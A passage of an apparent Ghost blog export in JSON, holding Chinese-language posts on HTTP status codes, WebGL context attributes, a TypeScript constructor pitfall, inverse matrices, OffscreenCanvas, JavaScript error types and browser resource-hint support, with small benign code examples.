已经被废弃的HTTP状态码\n307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向\n400 Bad Request 客户端请求的语法错误，服务器无法理解\n401 Unauthorized 请求要求用户的身份认证\n402 Payment Required 保留，将来使用\n403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求\n404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置\"您所请求的资源无法找到\"的个性页面\n405 Method Not Allowed 客户端请求中的方法被禁止\n406 Not Acceptable 服务器无法根据客户端请求的内容特性完成请求\n407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权\n408 Request Time-out 服务器等待客户端发送的请求时间过长，超时\n409 Conflict 服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突\n410 Gone 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置\n411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息\n412 Precondition Failed 客户端请求信息的先决条件错误\n413 Request Entity Too Large\n由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息\n414 Request-URI Too Large 请求的URI过长（URI通常为网址），服务器无法处理\n415 Unsupported Media Type 服务器无法处理请求附带的媒体格式\n416 Requested range not satisfiable 客户端请求的范围无效\n417 Expectation Failed 服务器无法满足Expect的请求头信息\n500 Internal Server Error 服务器内部错误，无法完成请求\n501 Not Implemented 服务器不支持请求的功能，无法完成请求\n502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求\n503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中\n504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求\n505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-10-03T07:38:34.000Z","created_by":"1","updated_at":"2019-03-19T08:25:04.000Z","updated_by":"1","published_at":"2018-10-03T09:15:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36d","uuid":"0df7234c-88a1-44b0-bbff-60e7485db6b3","title":"WebGLRenderingContext.getContextAttributes()","slug":"webglrenderingcontext-getcontextattributes","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"WebGL渲染，设置模板缓冲发现没有正确显示。即使gl.enable(gl.STENCIL_TEST)了。还有设置。\\n```\\nvar gl = canvas.getContext(\\\"webgl\\\",{stencil:true});\\n```\\n\\ngetContext可以有两个参数。contextAttributes如下。\\n```\\nalpha: 指示Canvas是否含有透明通道，若设置为false不透明，如果Canvas下叠加了其他元素时，可以在绘制时提升一些性能\\nantialias: 绘制时是否开启抗锯齿功能\\ndepth: 是否开启深度缓冲功能\\nfailIfMajorPerformanceCaveat: true表示当系统性能较低时，将不允许创建context。也就是是getContext()返回null。\\npowerPreference: 向用户代理提示，指示GPU的哪种配置适合WebGL上下文。\\n      \\\"default\\\" | \\\"high-performance\\\" | \\\"low-power\\\"\\npremultipliedAlpha: 这个功能做图形渲染的应该很熟悉，将alpha通道预先乘入rgb通道内，以提高合成性能，一两句话说不清，具体自己谷歌一下吧。\\npreserveDrawingBuffer: 是否保留缓冲区数据，如果你需要读取像素，或者复用绘制到主屏幕上的图像（实现脏矩形局部刷新），需要开启这个，否则浏览器在发生新的绘制操作的时候，有可能清空以前的数据。\\nstencil: 是否开启模板缓冲功能\\n```\\n\\n默认的参数\\n```\\n{ \\n  alpha: true, \\n  antialias: true, \\n  depth: true, \\n  failIfMajorPerformanceCaveat: false, \\n  powerPreference: \\\"default\\\",\\n  premultipliedAlpha: true, \\n  preserveDrawingBuffer: false, \\n  stencil: false \\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>WebGL渲染，设置模板缓冲发现没有正确显示。即使gl.enable(gl.STENCIL_TEST)了。还有设置。</p>\n<pre><code>var gl = canvas.getContext(&quot;webgl&quot;,{stencil:true});\n</code></pre>\n<p>getContext可以有两个参数。contextAttributes如下。</p>\n<pre><code>alpha: 指示Canvas是否含有透明通道，若设置为false不透明，如果Canvas下叠加了其他元素时，可以在绘制时提升一些性能\nantialias: 绘制时是否开启抗锯齿功能\ndepth: 是否开启深度缓冲功能\nfailIfMajorPerformanceCaveat: true表示当系统性能较低时，将不允许创建context。也就是是getContext()返回null。\npowerPreference: 向用户代理提示，指示GPU的哪种配置适合WebGL上下文。\n      &quot;default&quot; | &quot;high-performance&quot; | &quot;low-power&quot;\npremultipliedAlpha: 这个功能做图形渲染的应该很熟悉，将alpha通道预先乘入rgb通道内，以提高合成性能，一两句话说不清，具体自己谷歌一下吧。\npreserveDrawingBuffer: 是否保留缓冲区数据，如果你需要读取像素，或者复用绘制到主屏幕上的图像（实现脏矩形局部刷新），需要开启这个，否则浏览器在发生新的绘制操作的时候，有可能清空以前的数据。\nstencil: 是否开启模板缓冲功能\n</code></pre>\n<p>默认的参数</p>\n<pre><code>{ \n  alpha: true, \n  antialias: true, \n  depth: true, \n  failIfMajorPerformanceCaveat: false, \n  powerPreference: &quot;default&quot;,\n  premultipliedAlpha: true, \n  preserveDrawingBuffer: false, \n  stencil: false \n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"177","plaintext":"WebGL渲染，设置模板缓冲发现没有正确显示。即使gl.enable(gl.STENCIL_TEST)了。还有设置。\n\nvar gl = canvas.getContext(\"webgl\",{stencil:true});\n\n\ngetContext可以有两个参数。contextAttributes如下。\n\nalpha: 指示Canvas是否含有透明通道，若设置为false不透明，如果Canvas下叠加了其他元素时，可以在绘制时提升一些性能\nantialias: 绘制时是否开启抗锯齿功能\ndepth: 是否开启深度缓冲功能\nfailIfMajorPerformanceCaveat: true表示当系统性能较低时，将不允许创建context。也就是是getContext()返回null。\npowerPreference: 向用户代理提示，指示GPU的哪种配置适合WebGL上下文。\n      \"default\" | \"high-performance\" | \"low-power\"\npremultipliedAlpha: 这个功能做图形渲染的应该很熟悉，将alpha通道预先乘入rgb通道内，以提高合成性能，一两句话说不清，具体自己谷歌一下吧。\npreserveDrawingBuffer: 是否保留缓冲区数据，如果你需要读取像素，或者复用绘制到主屏幕上的图像（实现脏矩形局部刷新），需要开启这个，否则浏览器在发生新的绘制操作的时候，有可能清空以前的数据。\nstencil: 是否开启模板缓冲功能\n\n\n默认的参数\n\n{ \n  alpha: true, \n  antialias: true, \n  depth: true, \n  failIfMajorPerformanceCaveat: false, \n  powerPreference: \"default\",\n  premultipliedAlpha: true, \n  preserveDrawingBuffer: false, \n  stencil: false \n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-11-25T06:53:45.000Z","created_by":"1","updated_at":"2018-11-25T17:28:53.000Z","updated_by":"1","published_at":"2018-11-25T17:28:49.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36e","uuid":"85e97783-918a-45eb-8644-0823f90cdb95","title":"一个使用js/typescirpt隐藏问题。","slug":"yi-ge-shi-yong-typescirptyin-cang-wen-ti","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"下面这段代码，看似没什么问题。但是会报错，如下`Uncaught TypeError: Cannot read property 'a' of undefined`,这里会执行两次speak函数。第一次执行的时候，在Animal的构造函数，`this.speak()`，执行的却是Snake中的speak()。但是abc这是还没有初始化。 \\n```\\nclass Animal {\\n    constructor(public name: string) {\\n        this.speak();\\n    }\\n    speak() {\\n        \\n    }\\n}\\nclass Snake extends Animal {\\n    abc={ \\n        a:123\\n    }\\n    constructor(name: string) {\\n        super(name);\\n        this.speak();\\n    }\\n    speak() {\\n        console.log(this.abc.a);\\n    }\\n}\\nlet sam = new Snake(\\\"Sammy the Python\\\");\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>下面这段代码，看似没什么问题。但是会报错，如下<code>Uncaught TypeError: Cannot read property 'a' of undefined</code>,这里会执行两次speak函数。第一次执行的时候，在Animal的构造函数，<code>this.speak()</code>，执行的却是Snake中的speak()。但是abc这是还没有初始化。</p>\n<pre><code>class Animal {\n    constructor(public name: string) {\n        this.speak();\n    }\n    speak() {\n        \n    }\n}\nclass Snake extends Animal {\n    abc={ \n        a:123\n    }\n    constructor(name: string) {\n        super(name);\n        this.speak();\n    }\n    speak() {\n        console.log(this.abc.a);\n    }\n}\nlet sam = new Snake(&quot;Sammy the Python&quot;);\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"178","plaintext":"下面这段代码，看似没什么问题。但是会报错，如下Uncaught TypeError: Cannot read property 'a' of undefined\n,这里会执行两次speak函数。第一次执行的时候，在Animal的构造函数，this.speak()\n，执行的却是Snake中的speak()。但是abc这是还没有初始化。\n\nclass Animal {\n    constructor(public name: string) {\n        this.speak();\n    }\n    speak() {\n        \n    }\n}\nclass Snake extends Animal {\n    abc={ \n        a:123\n    }\n    constructor(name: string) {\n        super(name);\n        this.speak();\n    }\n    speak() {\n        console.log(this.abc.a);\n    }\n}\nlet sam = new Snake(\"Sammy the Python\");","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-12-10T09:44:51.000Z","created_by":"1","updated_at":"2019-03-26T09:54:54.000Z","updated_by":"1","published_at":"2018-12-10T09:50:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36f","uuid":"b227bb70-2d51-4bc1-96c2-0803b2a3f002","title":"opengl 逆矩阵的意义","slug":"opengl-ni-ju-zhen-de-yi-yi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n比如把点(1, 1)变到点(2, 2)，可以有两种做法：\\n①坐标系不动，点动，把(1, 1)点挪到(2, 2)；\\n②点不动，坐标系动，让x轴的度量（单位向量）变成原来的1/2，让y轴的度量（单位向量）变成原先的1/2，这样点还是那个点，点的坐标就变成(2, 2)了(用通俗的话说，先把点拿开，把空间挤压成1/2，再放回原位。)。\\n\\n这是应该困惑了，向量还是原样，但是，坐标变了，其实，这是指在第二个坐标系下，点坐标为（2,2）。\\n\\n向量这个东西客观存在，但是要把它表示出来，就要把它放在一个坐标系中去度量它，然后把度量的结果（向量在各个坐标轴上的投影值）按一定顺序列在一起，就成了我们平时所见的向量表示形式。你选择的坐标系不同，得出来的向量的表示就不同。向量还是那个向量，选择的坐标系不同，其表示方式就不同。\\n\\n假设第一个坐标系矩阵为m1.第二个坐标系矩阵为m2。m1为单位矩阵。\\n\\n```\\nlet m1 = new Mat4();\\nlet m2 = new Mat4();\\nm2.setScale(0.5, 0.5, 0.5);\\nlet p1 = new Vec4(1, 1, 0, 1);\\nlet p2 = new Vec4(2, 2, 0, 1);\\nexpect(m1.mulVec4(p1)).toEqual(m2.mulVec4(p2));\\nexpect(p2).toEqual(m2.invert().mulVec4(p1)); // p1在乘以m2坐标系逆矩阵,得出在m2坐标系下的坐标\\n```\\n使用逆矩阵，可以求出一个点在另一个坐标系的位置。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>比如把点(1, 1)变到点(2, 2)，可以有两种做法：<br>\n①坐标系不动，点动，把(1, 1)点挪到(2, 2)；<br>\n②点不动，坐标系动，让x轴的度量（单位向量）变成原来的1/2，让y轴的度量（单位向量）变成原先的1/2，这样点还是那个点，点的坐标就变成(2, 2)了(用通俗的话说，先把点拿开，把空间挤压成1/2，再放回原位。)。</p>\n<p>这是应该困惑了，向量还是原样，但是，坐标变了，其实，这是指在第二个坐标系下，点坐标为（2,2）。</p>\n<p>向量这个东西客观存在，但是要把它表示出来，就要把它放在一个坐标系中去度量它，然后把度量的结果（向量在各个坐标轴上的投影值）按一定顺序列在一起，就成了我们平时所见的向量表示形式。你选择的坐标系不同，得出来的向量的表示就不同。向量还是那个向量，选择的坐标系不同，其表示方式就不同。</p>\n<p>假设第一个坐标系矩阵为m1.第二个坐标系矩阵为m2。m1为单位矩阵。</p>\n<pre><code>let m1 = new Mat4();\nlet m2 = new Mat4();\nm2.setScale(0.5, 0.5, 0.5);\nlet p1 = new Vec4(1, 1, 0, 1);\nlet p2 = new Vec4(2, 2, 0, 1);\nexpect(m1.mulVec4(p1)).toEqual(m2.mulVec4(p2));\nexpect(p2).toEqual(m2.invert().mulVec4(p1)); // p1在乘以m2坐标系逆矩阵,得出在m2坐标系下的坐标\n</code></pre>\n<p>使用逆矩阵，可以求出一个点在另一个坐标系的位置。</p>\n<!--kg-card-end: markdown-->","comment_id":"179","plaintext":"比如把点(1, 1)变到点(2, 2)，可以有两种做法：\n①坐标系不动，点动，把(1, 1)点挪到(2, 2)；\n②点不动，坐标系动，让x轴的度量（单位向量）变成原来的1/2，让y轴的度量（单位向量）变成原先的1/2，这样点还是那个点，点的坐标就变成(2,\n2)了(用通俗的话说，先把点拿开，把空间挤压成1/2，再放回原位。)。\n\n这是应该困惑了，向量还是原样，但是，坐标变了，其实，这是指在第二个坐标系下，点坐标为（2,2）。\n\n向量这个东西客观存在，但是要把它表示出来，就要把它放在一个坐标系中去度量它，然后把度量的结果（向量在各个坐标轴上的投影值）按一定顺序列在一起，就成了我们平时所见的向量表示形式。你选择的坐标系不同，得出来的向量的表示就不同。向量还是那个向量，选择的坐标系不同，其表示方式就不同。\n\n假设第一个坐标系矩阵为m1.第二个坐标系矩阵为m2。m1为单位矩阵。\n\nlet m1 = new Mat4();\nlet m2 = new Mat4();\nm2.setScale(0.5, 0.5, 0.5);\nlet p1 = new Vec4(1, 1, 0, 1);\nlet p2 = new Vec4(2, 2, 0, 1);\nexpect(m1.mulVec4(p1)).toEqual(m2.mulVec4(p2));\nexpect(p2).toEqual(m2.invert().mulVec4(p1)); // p1在乘以m2坐标系逆矩阵,得出在m2坐标系下的坐标\n\n\n使用逆矩阵，可以求出一个点在另一个坐标系的位置。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-12-17T08:16:10.000Z","created_by":"1","updated_at":"2018-12-17T11:22:08.000Z","updated_by":"1","published_at":"2018-12-17T11:22:08.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d370","uuid":"b0e3cfa8-1387-4678-9588-5a66eb414d6a","title":"chrome OffscreenCanvas","slug":"webgl-offscreencanvas","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"最近在，写hypergl例子的时候，发现webgl不能稳定60fps。明明每帧的计算时间约2ms，远远小于16ms。用chrome分析，发现主线程中，很多chrome插件注入页面，都在主线程中执行，浪费了时间，而且主线程还管理页面各种渲染，css加载。导致帧数浮动。上次看chrome 更新日志，发现了这个[OffscreenCanvas](https://developers.google.com/web/updates/2018/08/offscreen-canvas)。使用webworker更新canvas，这个真的有用。\\n\\n\\n> 使用难点\\n\\n* 因为在webworker不能访问dom，window等。需要用postMessage通信才能解决。不过我觉得还是值得的。因为，webgl项目，只会用到一个canvas dom对象。不过事件需要通过postMessage传递。\\n\\n* webworker中Image不能用。用fetch。这样加载图片。\\n```\\n   fetch(url).then(b => b.blob()).then(blob => {\\n            return createImageBitmap(blob); // ImageBitmap\\n   });\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>最近在，写hypergl例子的时候，发现webgl不能稳定60fps。明明每帧的计算时间约2ms，远远小于16ms。用chrome分析，发现主线程中，很多chrome插件注入页面，都在主线程中执行，浪费了时间，而且主线程还管理页面各种渲染，css加载。导致帧数浮动。上次看chrome 更新日志，发现了这个<a href=\"https://developers.google.com/web/updates/2018/08/offscreen-canvas\">OffscreenCanvas</a>。使用webworker更新canvas，这个真的有用。</p>\n<blockquote>\n<p>使用难点</p>\n</blockquote>\n<ul>\n<li>\n<p>因为在webworker不能访问dom，window等。需要用postMessage通信才能解决。不过我觉得还是值得的。因为，webgl项目，只会用到一个canvas dom对象。不过事件需要通过postMessage传递。</p>\n</li>\n<li>\n<p>webworker中Image不能用。用fetch。这样加载图片。</p>\n</li>\n</ul>\n<pre><code>   fetch(url).then(b =&gt; b.blob()).then(blob =&gt; {\n            return createImageBitmap(blob); // ImageBitmap\n   });\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"180","plaintext":"最近在，写hypergl例子的时候，发现webgl不能稳定60fps。明明每帧的计算时间约2ms，远远小于16ms。用chrome分析，发现主线程中，很多chrome插件注入页面，都在主线程中执行，浪费了时间，而且主线程还管理页面各种渲染，css加载。导致帧数浮动。上次看chrome\n更新日志，发现了这个OffscreenCanvas\n[https://developers.google.com/web/updates/2018/08/offscreen-canvas]\n。使用webworker更新canvas，这个真的有用。\n\n> 使用难点\n\n\n * 因为在webworker不能访问dom，window等。需要用postMessage通信才能解决。不过我觉得还是值得的。因为，webgl项目，只会用到一个canvas\n   dom对象。不过事件需要通过postMessage传递。\n   \n   \n * webworker中Image不能用。用fetch。这样加载图片。\n   \n   \n\n   fetch(url).then(b => b.blob()).then(blob => {\n            return createImageBitmap(blob); // ImageBitmap\n   });","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-12-21T09:48:08.000Z","created_by":"1","updated_at":"2018-12-21T10:35:21.000Z","updated_by":"1","published_at":"2018-12-21T10:34:18.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d371","uuid":"f008c9a8-1b8b-4b98-bb1f-5bf514a47cae","title":"pbr 材质实现","slug":"pbr-cai-zhi-shi-xian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"PBR(Physically Based Rendering)，基于物理的渲染目的便是为了使用一种更符合物理学规律的方式来模拟光线。这种渲染方式与我们原来的Phong或者Blinn-Phong光照算法相比总体上看起来要更真实一些。\\n\\n\\n> 判断一种PBR光照模型是否是基于物理的，必须满足以下三个条件（不用担心，我们很快就会了解它们的）：\\n\\n* 基于微平面(Microfacet)的表面模型。\\n* 能量守恒。\\n* 应用基于物理的BRDF。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>PBR(Physically Based Rendering)，基于物理的渲染目的便是为了使用一种更符合物理学规律的方式来模拟光线。这种渲染方式与我们原来的Phong或者Blinn-Phong光照算法相比总体上看起来要更真实一些。</p>\n<blockquote>\n<p>判断一种PBR光照模型是否是基于物理的，必须满足以下三个条件（不用担心，我们很快就会了解它们的）：</p>\n</blockquote>\n<ul>\n<li>基于微平面(Microfacet)的表面模型。</li>\n<li>能量守恒。</li>\n<li>应用基于物理的BRDF。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"181","plaintext":"PBR(Physically Based\nRendering)，基于物理的渲染目的便是为了使用一种更符合物理学规律的方式来模拟光线。这种渲染方式与我们原来的Phong或者Blinn-Phong光照算法相比总体上看起来要更真实一些。\n\n> 判断一种PBR光照模型是否是基于物理的，必须满足以下三个条件（不用担心，我们很快就会了解它们的）：\n\n\n * 基于微平面(Microfacet)的表面模型。\n * 能量守恒。\n * 应用基于物理的BRDF。","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-12-25T13:09:18.000Z","created_by":"1","updated_at":"2018-12-25T15:00:07.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d372","uuid":"adbadf51-e0f4-40b9-aa7e-e0f99842447f","title":"Gamma校正","slug":"gammaxiao-zheng","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"182","plaintext":null,"feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-12-25T15:00:33.000Z","created_by":"1","updated_at":"2018-12-25T15:00:33.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d373","uuid":"959df36d-099e-4251-ab9a-cdae12963202","title":"js 错误类型","slug":"js-cuo-wu-lei-xing","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* [EvalError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/EvalError) 本对象代表了一个关于 eval 函数的错误.此异常不再会被JavaScript抛出，但是EvalError对象仍然保持兼容性.\\n`EvalError 不在当前ECMAScript规范中使用，因此不会被运行时抛出. 但是对象本身仍然与规范的早期版本向后兼容`\\n* [InternalError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/InternalError) 对象表示出现在JavaScript引擎内部的错误。 例如： \\n\\\"InternalError: too much recursion\\\"（内部错误：递归过深）。\\n* [RangeError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RangeError) 对象标明一个错误，当一个值不在其所允许的范围或者集合中。\\n* [ReferenceError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError)（引用错误） 对象代表当一个不存在的变量被引用时发生的错误。\\n```\\ntry {\\n  var a = undefinedVariable;\\n} catch (e) {\\n  console.log(e); // ReferenceError: undefinedVariable is not defined\\n  console.log(e instanceof ReferenceError); // true\\n}\\n```\\n* [SyntaxError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SyntaxError) 对象代表尝试解析语法上不合法的代码的错误。\\n```\\ntry {\\n  eval('hoo bar');\\n} catch (e) {\\n  console.log(e);   // SyntaxError: Unexpected identifier\\n  console.log(e instanceof SyntaxError); // true\\n}\\n```\\n* [TypeError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError)（类型错误） 对象用来表示值的类型非预期类型时发生的错误。\\n```\\ntry {\\n  var a={}\\n  a.asd()\\n} catch (e) {\\n  console.log(e); // TypeError: a.asd is not a function\\n  console.log(e instanceof TypeError); // true\\n}\\n```\\n* [URIError](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/URIError) 对象用来表示以一种错误的方式使用全局URI处理函数而产生的错误。\\n```\\ntry {\\n  decodeURIComponent('%');\\n} catch (e) {\\n  console.log(e);  // URIError: URI malformed\\n  console.log(e instanceof URIError); // true\\n}\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/EvalError\">EvalError</a> 本对象代表了一个关于 eval 函数的错误.此异常不再会被JavaScript抛出，但是EvalError对象仍然保持兼容性.<br>\n<code>EvalError 不在当前ECMAScript规范中使用，因此不会被运行时抛出. 但是对象本身仍然与规范的早期版本向后兼容</code></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/InternalError\">InternalError</a> 对象表示出现在JavaScript引擎内部的错误。 例如：<br>\n&quot;InternalError: too much recursion&quot;（内部错误：递归过深）。</li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RangeError\">RangeError</a> 对象标明一个错误，当一个值不在其所允许的范围或者集合中。</li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError\">ReferenceError</a>（引用错误） 对象代表当一个不存在的变量被引用时发生的错误。</li>\n</ul>\n<pre><code>try {\n  var a = undefinedVariable;\n} catch (e) {\n  console.log(e); // ReferenceError: undefinedVariable is not defined\n  console.log(e instanceof ReferenceError); // true\n}\n</code></pre>\n<ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SyntaxError\">SyntaxError</a> 对象代表尝试解析语法上不合法的代码的错误。</li>\n</ul>\n<pre><code>try {\n  eval('hoo bar');\n} catch (e) {\n  console.log(e);   // SyntaxError: Unexpected identifier\n  console.log(e instanceof SyntaxError); // true\n}\n</code></pre>\n<ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError\">TypeError</a>（类型错误） 对象用来表示值的类型非预期类型时发生的错误。</li>\n</ul>\n<pre><code>try {\n  var a={}\n  a.asd()\n} catch (e) {\n  console.log(e); // TypeError: a.asd is not a function\n  console.log(e instanceof TypeError); // true\n}\n</code></pre>\n<ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/URIError\">URIError</a> 对象用来表示以一种错误的方式使用全局URI处理函数而产生的错误。</li>\n</ul>\n<pre><code>try {\n  decodeURIComponent('%');\n} catch (e) {\n  console.log(e);  // URIError: URI malformed\n  console.log(e instanceof URIError); // true\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"183","plaintext":" * EvalError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/EvalError] \n   本对象代表了一个关于 eval 函数的错误.此异常不再会被JavaScript抛出，但是EvalError对象仍然保持兼容性.\n   EvalError 不在当前ECMAScript规范中使用，因此不会被运行时抛出. 但是对象本身仍然与规范的早期版本向后兼容\n * InternalError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/InternalError] \n   对象表示出现在JavaScript引擎内部的错误。 例如：\n   \"InternalError: too much recursion\"（内部错误：递归过深）。\n * RangeError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RangeError] \n   对象标明一个错误，当一个值不在其所允许的范围或者集合中。\n * ReferenceError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError]\n   （引用错误） 对象代表当一个不存在的变量被引用时发生的错误。\n\ntry {\n  var a = undefinedVariable;\n} catch (e) {\n  console.log(e); // ReferenceError: undefinedVariable is not defined\n  console.log(e instanceof ReferenceError); // true\n}\n\n\n * SyntaxError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SyntaxError] \n   对象代表尝试解析语法上不合法的代码的错误。\n\ntry {\n  eval('hoo bar');\n} catch (e) {\n  console.log(e);   // SyntaxError: Unexpected identifier\n  console.log(e instanceof SyntaxError); // true\n}\n\n\n * TypeError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError]\n   （类型错误） 对象用来表示值的类型非预期类型时发生的错误。\n\ntry {\n  var a={}\n  a.asd()\n} catch (e) {\n  console.log(e); // TypeError: a.asd is not a function\n  console.log(e instanceof TypeError); // true\n}\n\n\n * URIError\n   [https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/URIError] \n   对象用来表示以一种错误的方式使用全局URI处理函数而产生的错误。\n\ntry {\n  decodeURIComponent('%');\n} catch (e) {\n  console.log(e);  // URIError: URI malformed\n  console.log(e instanceof URIError); // true\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2019-03-06T16:32:31.000Z","created_by":"1","updated_at":"2019-03-06T17:04:44.000Z","updated_by":"1","published_at":"2019-03-06T16:35:21.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d374","uuid":"055db354-d041-4adb-a52c-4e4f382178ce","title":"dns-prefetch\tsubresource\tprefetch\tprerender","slug":"dns-prefetch-subresource-prefetch-prerender","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<table>\\n          <thead>\\n            <tr>\\n              <th>Browser\\n              </th><th>dns-prefetch\\n              </th><th>subresource\\n              </th><th>prefetch\\n              </th><th>prerender\\n\\n          </th></tr></thead><tbody>\\n            <tr>\\n              <td>Firefox\\n              </td><td>3.5+\\n              </td><td>n/a\\n              </td><td>3.5+\\n              </td><td>n/a\\n\\n            </td></tr><tr>\\n              <td>Chrome\\n              </td><td>1.0+\\n              </td><td>1.0+\\n              </td><td>1.0+\\n              </td><td>13+\\n\\n            </td></tr><tr>\\n              <td>Safari\\n              </td><td>5.01+\\n              </td><td>n/a\\n              </td><td>n/a\\n              </td><td>n/a\\n\\n            </td></tr><tr>\\n              <td>IE\\n              